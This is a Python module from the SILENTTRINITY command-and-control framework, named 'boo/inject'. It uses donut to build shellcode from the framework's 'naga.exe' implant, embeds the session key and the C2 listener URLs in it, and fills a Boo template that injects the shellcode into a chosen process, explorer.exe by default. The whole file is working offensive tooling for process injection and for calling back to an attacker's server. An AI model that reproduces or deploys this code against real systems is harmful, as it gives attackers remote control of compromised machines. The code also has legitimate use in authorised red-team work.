import donut
import uuid
from silenttrinity.core.events import Events
from silenttrinity.core.teamserver import ipc_server
from silenttrinity.core.teamserver.crypto import gen_stager_psk
from silenttrinity.core.utils import shellcode_to_int_byte_array, print_bad, get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/inject'
        self.language = 'boo'
        self.description = 'Injects a SILENTTRINITY session into the specified process using shellcode'
        self.run_in_thread = False
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Listener': {
                'Description'   :   'Listener to use',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcessName': {
                'Description'   :   'Name of process to inject into. [Not used if PID is set to value other than 0]',
                'Required'      :   False,
                'Value'         :   'explorer'
            },
            'PID': {
                'Description'   :   'PID to inject into. [Will use ProcessName if 0]',
                'Required'      :   False,
                'Value'         :   '0' 
            },
            'Architecture' : {
                'Description'   :   'Architecture of process to inject into (x64, x86, x64+x86). [Warning: getting this wrong will crash things]',
                'Required'      :   False,
                'Value'         :   'x64+x86'
            }
            #'InjectionMethod': {
            #    'Description'   :   'Injection Method',
            #    'Required'      :   False,
            #    'Value'         :   'InjectRemote'
            #}
        }

    def payload(self):
        listener = ipc_server.publish_event(Events.GET_LISTENERS, (self.options['Listener']['Value'],))
        if listener:
            c2_urls = ','.join(
                filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
            )

            guid = uuid.uuid4()
            psk = gen_stager_psk()
            ipc_server.publish_event(Events.SESSION_REGISTER, (guid, psk))

            #Determine which architecture to use.
            #Default is amd64+86 (dual-mode)
            arch = 3

            #User can specify 64-bit or 32-bit
            if self.options['Architecture']['Value'] == 'x64':
                arch = 2
            elif self.options['Architecture']['Value'] == 'x86':
                arch = 1

            donut_shellcode = donut.create(file=get_path_in_package('core/teamserver/data/naga.exe'), params=f"{guid};{psk};{c2_urls}", arch=arch)

            shellcode = shellcode_to_int_byte_array(donut_shellcode)
            #if self.options['InjectionMethod']['Value'] == 'InjectRemote':
            with open(get_path_in_package('core/teamserver/modules/boo/src/injectremote.boo'), 'r') as module_src:
                src = module_src.read()
                src = src.replace('BYTES', shellcode)
                src = src.replace('PROCESS', self.options['ProcessName']['Value'])
                src = src.replace('PID', self.options['PID']['Value'])
                return src
        else:
            print_bad(f"Listener '{self.options['Listener']['Value']}' not found!")
